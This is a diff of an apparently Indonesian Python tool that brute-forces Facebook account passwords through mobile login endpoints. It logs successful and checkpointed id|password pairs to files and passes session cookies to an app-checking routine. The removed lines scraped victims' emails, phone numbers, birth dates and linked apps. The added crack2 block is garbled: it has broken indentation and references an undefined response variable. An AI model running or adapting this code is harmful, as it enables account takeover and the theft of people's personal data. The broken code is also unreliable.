@@ -1290,13 +1290,10 @@ def passwrd():
 			else:
 				pool.submit(crack,idf,pwv)
 	print('')
-	tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
-	sol().print(mark(tanya, style='cyan'))
-	woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
-	if woi in ['y','Y']:
-		cek_opsi()
-	else:
-		exit()
+	print(f'\33[1;96m  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
+	print(f'{x}  [{h}•{x}]{h} OK : {h}%s '%(ok))
+	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))
+	
 def reguler2(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
@@ -1449,97 +1446,36 @@ def crack(idf,pwv):
 			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				if 'ya' in oprek:
+				if'no' in gabriel:
+					cp+=1
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}') 
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					akun.append(idf+'|'+pw)
+					break
+				elif 'ya' in gabriel:
+					cp+=1
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}') 
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
-				else:
-					print('\n')
-					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
-					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='SESI'))
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-					akun.append(idf+'|'+pw)
-					cp+=1
-				break
+					break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
 				if 'no' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}'
-					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title=' NO SESI'))
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}') 
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-					user=idf
-					infoakun = ""
-					session = requests.Session()
-					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
-					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
-					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
-					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
-					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
-					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
-					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
-					except:nomer = ""
-					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
-					except:email=""
-					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
-					except:ttl=""
-					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
-					except:teman = ""
-					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
-					except:pengikut = ""
-					try:
-						tahun = ""
-						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
-						for nenen in cek_thn:
-							tahun += nenen+", "
-					except:pass
-
-					infoakun += (f"[••] Nama Akun       : {nama}\n[••] Jumlah Teman    : {teman}\n[••] Jumlah Pengikut : {pengikut}\n[••] Email Aktif     : {email}\n[••] Nomor Aktif     : {nomer}\n[••] Tahun Akun      : {tahun}\n[••] Tanggal Lahir   : {ttl}\n")
-
-					hit1, hit2 = 0,0
-					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
-					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
-					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
-						infoakun += (f"Aplikasi Yang Terkait*\n")
-						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
-							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
-						else:
-							infoakun += (f"	Aplikasi Aktif : \n")
-							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
-							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
-							for muncul in apkAktif:
-								hit1+=1
-								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
-								hit2+=1
-						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
-							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
-						else:
-							hit1,hit2=0,0
-							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
-							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
-							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
-							for muncul in apkKadaluarsa:
-								hit1+=1
-								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
-								hit2+=1
-					else:pass
-					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
-					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='OK'))
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					cek_apk(kuki)
 					break
-
-
+				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
@@ -1558,21 +1494,37 @@ def crack2(idf,pwv):
 		try:
 			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
-			if "www.facebook.com" in resp.json()["error_msg"]:
-				if 'ya' in oprek:
+			if "checkpoint" in po.cookies.get_dict().keys():
+			if 'no' in gabriel:
+					cp+=1
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}') 
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					akun.append(idf+'|'+pw)
+					break
+				elif 'ya' in gabriel:
+					cp+=1
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}') 
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
-				else:
-					print('\r%s++++ %s|%s ----> CP       '%(b,idf,pw))
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-					akun.append(idf+'|'+pw)
-					cp+=1
-				break
-			elif "session_key" in resp.text and "EAAA" in resp.text:
-				print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
-				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				ok+=1
-				break
+					break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				if 'no' in taplikasi:
+					ok+=1
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}') 
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					break
+				elif 'ya' in taplikasi:
+					ok+=1
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					cek_apk(kuki)
+					break
+				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
